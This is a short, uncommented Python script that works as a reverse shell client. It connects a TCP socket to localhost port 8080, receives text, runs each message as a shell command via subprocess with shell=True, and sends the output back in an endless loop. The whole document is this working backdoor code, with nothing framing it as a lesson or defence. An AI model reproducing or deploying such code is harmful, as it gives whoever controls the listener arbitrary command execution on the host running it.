from subprocess import PIPE, run
import socket
soc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soc.connect(("localhost",8080))
while True:
    recdata=soc.recv(1024)
    print(recdata.decode())
    terminal=run(recdata.decode(),stdout=PIPE,shell=True,stderr=PIPE,universal_newlines=True).stdout
    soc.send(terminal.encode())
